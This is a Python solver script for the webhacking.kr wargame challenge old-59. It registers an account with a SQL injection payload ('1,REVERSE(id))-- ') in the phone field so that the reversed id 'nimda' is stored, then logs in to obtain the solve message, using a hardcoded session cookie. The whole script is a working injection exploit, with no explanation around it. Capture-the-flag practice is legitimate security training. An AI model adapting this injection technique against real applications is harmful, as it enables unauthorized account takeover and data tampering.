import requests

url = "https://webhacking.kr/challenge/web-36/"
cookie = {'PHPSESSID':'9lv1si15q4h3an2c7j2f6bt1k1'}

def join():
    payload = {'id': 'nimda', 'phone':'1,REVERSE(id))-- '}
    requests.post(url, data=payload, cookies=cookie)
    print("Join Successful.")

def login():
    payload = {'lid': 'nimda', 'lphone':'1'}
    res = requests.post(url, data=payload, cookies=cookie)
    if "old-59 Pwned!" in res.text:
        print("old-59 Pwned!")
    elif 'already solve' in res.text:
        print("already solve")

if __name__ == "__main__":
    join()
    login()
